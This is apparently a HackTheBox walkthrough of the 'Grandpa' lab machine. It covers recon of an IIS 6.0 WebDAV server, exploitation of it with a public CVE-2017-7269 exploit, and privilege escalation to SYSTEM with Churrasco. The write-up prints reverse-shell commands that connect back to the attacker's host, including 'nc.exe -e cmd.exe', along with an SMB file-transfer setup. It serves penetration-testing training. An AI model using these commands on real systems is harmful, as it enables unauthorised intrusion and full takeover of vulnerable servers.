# Grandpa [HTB](https://app.hackthebox.com/machines/13)
![grandpa-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/grasndpa-01.png)

## Recon

After adding the target to `/etc/hosts`, I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 grandpa.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/ports-02.png)

A single HTTP port. Let's perfrom service and version detection:

```bash
nmap -p 80 -sCV grandpa.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/nmap-res-03.png)

We can see that `nmap` has identified that [WebDAV](https://en.wikipedia.org/wiki/WebDAV) is enabled on this server. In short, `WebDAV` are extensions to the HTTP protocol that allows authorized users to create, change and move documents on the server. Thus, allowing the server to be viewed as a modifiable, collaborative medium instead of a read-only medium. 

In terms of a pentest, we want to try and leverage the `WebDAV` to uplaod and execute files on the server. Usually, to connect to the `WebDAV`server we need valid credentials, so if we dont have any we might need to [brute force](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#http-basic-auth). Other then that, we need to determine which methods are supported by the server, and which file extensions can be uploaded, etc. 

We can run tools like `davtest` and `curl` to enumerate the `WebDAV` server further. `HackTricks` has a nice [overview](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav) we can follow.

Based on the `nmap` scan we can also see that the web server is an IIS 6.0. This is relevant, because there is a buffer-overflow [exploit](https://www.exploit-db.com/exploits/41738) for IIS 6.0 servers with `WebDAV`, however I want to try and go the manual route first.

### IIS Port 80

Let's start by opening the site at `http://grandpa.htb`:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/site-04.png)

Not much to see here. Let's run a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://grandpa.htb/FUZZ -e .aspx,.cgi,.txt,.xml,.conf,.html
```

Which brings the following result:

![images-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/images-05.png)

![private-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/private-06.png)

Trying to open the `images` directory eventually ends up with a `403` forbidden code after a couple of redirects. The `_private` directory looks more interesting though, typically `WebDAV` directories are prefixed with an underscore to try and hide them. 

Let's try to upload a file, We can do this with:

```bash
curl -i -s -k -X PUT http://grandpa.htb/_private -d @test.txt
```

This didnt work I got a `403` error. I tried different file extensions like `html`, and `png`. I tried to upload to different directories like the root of the server and `images` nothing worked. 

I decided to run `davtest` to see if it can cover something I missed:

```bash
davtest -url http://grandpa.htb/_private
```

![davtest-07}(https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/davtest-07.png)


Trying different directories does at least connect, but we cant upload or do anything on them 
![davtest-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/davtest-08.png)

I think it's safe to conclude that we cant manually exploit the `WebDAV` itself. Let's go for the buffer-overfow expliot.

### Buffer-Overflow


If we go to the [ExploitDB](https://www.exploit-db.com/exploits/41738) version, we can see that the shellcode launches `cala.exe` instead of a remote shell:

![calc-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/calc-09.png)

We dont want that. We could try to generate our own shellcode and simply replace the one in the script. 
This however is not so simple, and for me it didnt work. 

So I searched online and found [this exploit](https://github.com/danigargu/explodingcan/tree/master). It  has a clean code, and the most stars. This one also specified that the shellcode needs to be alphanumeric encoded, which is interesting. 

At first I tried to get a standard shell without a meterpreter but this didnt work. So instead I followed the instructioins on the github page and generated a meterpreter shellcode. I then setup `multi/handler` and got a shell in meterpreter using `msfconsole`.

This worls, but I want to try and avoid `metasploit` as much as possible, so I searched online for other exploits and I found [this one](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269). 

Based on the source code, we can see the expected arguments when invoking the script:

![source-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/source-10.png)

We need to specify the remote IP and port of the target, as well as our listener's. But I dont see the exploit creating a thread to catch the reverse shell so we need to do that ourselfes. 

I setup the listener with:

```bash
rlwrap nc -lnvp 443
```

And execute the exploit with:

```bash
python2 exploit.py 10.129.95.233 80 10.10.14.46 443
```

The script hangs for a few seconds, then I get a shell on my `nc`:

![shell-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/shell-11.png)

## Privilege Escalation

Immediately after landing on the machine I start hunting for quick wins. I started by looking for stored credentials with `cmdkey /list` but there are none. 

I then move on to look for user privileges with `whoami /priv`:

![privs-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/privs-12.png)

Here we can see our user has the `Impersonate` privileges enabled, which means we can try to pull of a [potato attack](https://jlajara.gitlab.io/Potatoes_Windows_Privesc). My go to for Windows servers < 2019 is [JuicyPotato](https://github.com/ohpe/juicy-potato), but this is an old Windows server:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
``` 

![sysinfo-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/sysinfo-15.png)


So instead let's try [Churrasco](https://github.com/Re4son/Churrasco/). To pull this off we need to transfer the `Churrasco` binary over to the target along with `nc.exe`. This, I typically achive with a python server on my attack machine, and `certutil` to downlaod the files over to the target. 

However on this machine, there is an issue:

![cert-err-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/cert-err-13.png)

I know my syntax is correct, as it works on virtually any other Windows machine, but here it doens't. Searching this error online, I came to find that we have an issue with the Certificate Revocation List (CRL) being expired. Thus causing applications that need to check the revocation status of certificates issued by this CA to fail.

I tried to find a way to craete a new CRL using `certutil -CRL`, didnt work. I tried to create a new certificate database with `certutil -N -d .`, didnt work. After a few dozen minutes googling I decided to give up on the idea and try powershell instead.

This is where I encountered another issue:

![no-ps-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/no-ps-14.png)

I tried searching for `C:\\Windows\System32\WindowsPowerShell`, there is none. Powershell was intoruced with Windows server 2008, but it was addedd to Windoes server 2003, just not this one I guess. 

Instead let's setup an SMB server on my attack machine using `impacket`:

```bash
impacket-smbserver -smb2support grandpa .
```
 
Then I connect to the share and copy the files over from the target using:

```cmd
net use \\10.10.14.46\grandpa
copy \\10.10.14.46\grandpa\churrasco.exe
copy \\10.10.14.46\grandpa\nc.exe
```

Now we can see both files are on the target:

![files-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/files-15.png)

Now we can test `churrasco` by running `churrasco.exe "whoami"`:

![whoami-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/whoami-16.png)

We can see that is works, and we have command execution as the `SYSTEM`. 

So now we can setup a listener on our Kali machine with:

```bash
rlwrap nc -lnvp 8080
```

And use `nc.exe` to connect back to our machine:

```cmd
churrasco.exe "C:\\windows\Temp\nc.exe -e cmd.exe 10.10.14.46 8080"
```

Which gets us a shell as the `SYSTEM`:

![root-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Grandpa/img/root-17.png)




